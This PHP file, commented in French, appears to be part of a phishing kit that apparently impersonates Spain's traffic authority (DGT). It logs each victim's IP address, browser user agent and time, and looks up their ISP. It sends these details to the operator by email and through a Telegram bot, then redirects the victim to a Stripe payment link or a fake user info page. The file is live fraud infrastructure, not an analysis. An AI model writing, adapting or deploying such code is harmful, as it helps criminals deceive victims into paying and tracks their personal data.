<?php
session_start();
include '../settings.php';
date_default_timezone_set('Europe/Paris');
// Enregistrement des informations dans la session
$_SESSION['date_heure'] = date('d/m/y, H:i:s');
$ip = $_SESSION['ip'] = $_SERVER['REMOTE_ADDR'];
$_SESSION['useragent'] = $_SERVER['HTTP_USER_AGENT'];

// Vérifie si le bouton n'a PAS été cliqué
if (!isset($_POST['btn_message'])) {
    // Utilisez des guillemets doubles pour permettre l'interpolation des variables dans la chaîne
    $message = " [🇪🇸] »» $ip est redirigé sur la page info le : {$_SESSION['date_heure']} ";

    // Obtenir des informations sur l'IP en utilisant ip-api.com
    $apiUrl = "http://ip-api.com/json/$ip";
    $ipInfo = json_decode(file_get_contents($apiUrl));

    // Récupérer l'ISP (Internet Service Provider)
    $isp = isset($ipInfo->isp) ? $ipInfo->isp : 'N/A';

    if ($mail_sending == true) {
        // Utilisez l'ISP dans le sujet du mail
        $subject = "[🇪🇸]  Notif page info | ISP: $isp | IP: $ip";
        $headers = "From: DGT | ESPAGNE <rez@pablo.fr>";
        mail($rezmail, $subject, $message, $headers);
    }

    if ($telegram_sending == true) {
        // Utilisez l'ISP dans le message Telegram
        $data = [
            'text' => "$message\nISP: $isp",
            'chat_id' => $chat_autoriser
        ];
        // Utilisez urlencode pour éviter les problèmes d'encodage dans l'URL
        file_get_contents("https://api.telegram.org/bot$bot_token/sendMessage?" . http_build_query($data));
    }
	if ($stripe_page === true ){
	 header('Location: https://buy.stripe.com/9AQbK49B44yx6Mo4gg?locale=es&__embed_source=buy_btn_1Oam5aLcrOhAGEcznYjFPi9b');
    exit(); 	
	}
	else {
   
    header('Location: ../user/info.php');
    exit(); // Assurez-vous de terminer le script après une redirection
	}
} else {
    // Redirection > Error 404
    header('Location: ../user/login.php?error=1');
    exit(); // Assurez-vous de terminer le script après une redirection
}
?>
